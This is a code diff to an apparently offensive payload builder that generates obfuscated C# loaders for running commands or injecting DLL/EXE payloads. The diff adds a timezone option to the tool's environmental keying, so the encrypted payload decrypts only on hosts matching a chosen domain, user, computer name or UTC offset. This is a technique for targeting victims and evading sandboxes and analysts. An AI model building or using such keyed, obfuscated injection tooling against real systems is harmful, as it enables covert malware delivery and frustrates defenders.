@@ -41,6 +41,7 @@ parser_cs_ps = subparsers.add_parser('cs-process', help='C# Process help')
 parser_cs_ps.add_argument('--domain', '-d', help='Domain name to check for')
 parser_cs_ps.add_argument('--user', '-u', help='User name to check for')
 parser_cs_ps.add_argument('--computer', '-c', help='Computer name to check for')
+parser_cs_ps.add_argument('--timezone', '-tz', help='System timezone (format: UTC-05, UTC+02')
 parser_cs_ps.add_argument('--payload', '-x', help='Command to run')
 parser_cs_ps.add_argument('--payload_file', help='File containing payload to run')
 
@@ -49,6 +50,7 @@ parser_cs_inj = subparsers.add_parser('cs-inject', help='C# PE Injection help')
 parser_cs_inj.add_argument('--domain', '-d', help='Domain name to check for')
 parser_cs_inj.add_argument('--user', '-u', help='User name to check for')
 parser_cs_inj.add_argument('--computer', '-c', help='Computer name to check for')
+parser_cs_inj.add_argument('--timezone', '-tz', help='System timezone (format: UTC-05, UTC+02')
 parser_cs_inj.add_argument('--payload_file', help='DLL/EXE to be loaded on decryption')
 
 # Parse  argument lists
@@ -128,6 +130,8 @@ try:
             check = "System.Security.Principal.WindowsIdentity.GetCurrent().Name;\n" + envKey + " = " + envKey + ".Split('\\\\')[1]"
         elif args.computer:
             check = "System.Security.Principal.WindowsIdentity.GetCurrent().Name;\n" + envKey + " = " + envKey + ".Split('\\\\')[0]"
+        elif args.timezone:
+            check = "'UTC' + Convert.ToString(System.TimeZone.CurrentTimeZone.GetUtcOffset(DateTime.Now)).Substring(0,3);"
         # Replace original variable and function names with obfuscated ones
         with open("templates/spotter-inject.cs", "rt") as fin:
             r1 = fin.read().replace('encDllB64', encDllB64)
@@ -175,6 +179,8 @@ try:
             check = "System.Security.Principal.WindowsIdentity.GetCurrent().Name;\n" + envKey + " = " + envKey + ".Split('\\\\')[1]"
         elif args.computer:
             check = "System.Security.Principal.WindowsIdentity.GetCurrent().Name;\n" + envKey + " = " + envKey + ".Split('\\\\')[0]"
+        elif args.timezone:
+            check = "'UTC' + Convert.ToString(System.TimeZone.CurrentTimeZone.GetUtcOffset(DateTime.Now)).Substring(0,3);"
         #print(encrypted)
         with open("templates/spotter-process.cs", "rt") as fin:
             r1 = fin.read().replace('ENCODED_COMMAND', encrypted)
